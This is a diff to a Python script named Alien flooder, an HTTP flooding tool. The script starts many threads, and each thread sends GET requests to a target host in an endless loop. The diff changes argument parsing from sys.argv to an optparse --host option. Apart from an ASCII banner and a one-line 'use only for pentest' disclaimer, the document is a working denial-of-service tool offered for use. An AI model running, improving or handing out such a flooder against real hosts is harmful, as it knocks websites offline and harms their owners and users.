@@ -1,4 +1,4 @@
-
+#! /usr/bin/env python
 """
 Requirements:
 
@@ -9,13 +9,13 @@ requests module installation in (Debian-based distribution):
 sudo apt-get install python-requests
 
 Usage :
-python alien-stresser.py <HOST>
-python alien-stresser.py http://www.domain.com
+./alien-stresser.py --host <<host>>
+./alien-stresser.py --host http://www.domain.com
 
 """
 
 
-
+import optparse
 import time
 import sys
 import threading #modules importation
@@ -28,29 +28,37 @@ except ImportError: # if requests module isn't installed
 	else: # else
 		print (" install requets module for python here : https://pypi.python.org/pypi/requests/2.9.1 ")
 		sys.exit() #exit
+		
 
-    
            
-def stresser(): # stresser function 
+def stresser(): # stresser function
+	
+	parser = optparse.OptionParser(usage="./alien.py --host www.domain.com")
+	parser.add_option("--host" , help=" host to flood " , action="store" , dest="host" , type="string")
+	option , args = parser.parse_args()
+	if option.host :
+		host = ((option.host)) 
+		if (host.find("http")) == -1 :
+			_host = "http://" +  (host)
+		elif (host.find("http")) == 0 :
+			_host = (host)
+	elif not option.host :
+		parser.error(" alien.py require --host option  type -h for help ")
+		sys.exit()
                                                                 
-    host = (sys.argv[1]) # host argument
-    if (sys.argv[1].find("http")) == -1 :
-        _host = "http://" + (host)
-    elif (host.find("http"))  == 0   :
-        _host =  (host)
-    while 1 < 4: #infinite loop
-	try:
-    		requests.get(_host) # sending requests
-		print ("[*] flooding {} in port 80  ".format(_host)) 
-	except (requests.ConnectionError,requests.HTTPError) : #if host don't exist
-		print ("[-] host don't exist  ")
-		sys.exit() # exit
+	while (1 < 4) : #infinite loop
+		try:
+			requests.get(_host) # sending requests
+			print (" [*] flooding {} in port 80  ".format(_host)) 
+		except (requests.ConnectionError,requests.HTTPError) : #if host don't exist
+			print ("[-] host don't exist  ")
+			sys.exit() # exit
 
 
 
 def _threads_(): # threading function
 	 
-	 
+	
 	 c= threading.Thread(target=stresser) #creating threads
 	 d= threading.Thread(target=stresser)
 	 a= threading.Thread(target=stresser)
@@ -64,7 +72,6 @@ def _threads_(): # threading function
 	 z1= threading.Thread(target=stresser)
 	 x1= threading.Thread(target=stresser)
 
-	 
 	 c.start() # starting threads
 	 d.start()
 	 a.start()
@@ -82,15 +89,9 @@ def _threads_(): # threading function
 	 
 	
 def main(): # main function ( most important )
-
-    if len(sys.argv) != 2 : #arguments parsing
-		   print ("* alienflood.py require a argument(target) * ")
-		   print("")
-		   print ("Usage : python Alienflood.py  <<host>> ")
-		   print ("Example: python  Alienflood.py https://www.domain.com ")
-    elif len(sys.argv) == 2 :
+	
 		
-		   print ("""
+	print ("""
 ********************************
 *        _______                 * 
 *     .adOOOOOOOOOba.            *
@@ -115,14 +116,15 @@ def main(): # main function ( most important )
 * Alien flooder (HTTP flooder)   *
 **********************************      
 """)  # ascii code (index)
-		   print ("[*] start flooding ") #info
-		   print ("[*] type ALT + F4 for stop flooder ") #info
+	print ("[*] start flooding ") #info
+	print ("[*] type ALT + F4 for stop flooder ") #info
 		   
-		   time.sleep(3) # sleeping
-		   _threads_() # threading function start
+	time.sleep(3) # sleeping
+	_threads_() # threading function start
 
 		
 main() #main function start
 
 #end , author : Hadi999
 #use only for pentest not for hacking 
+
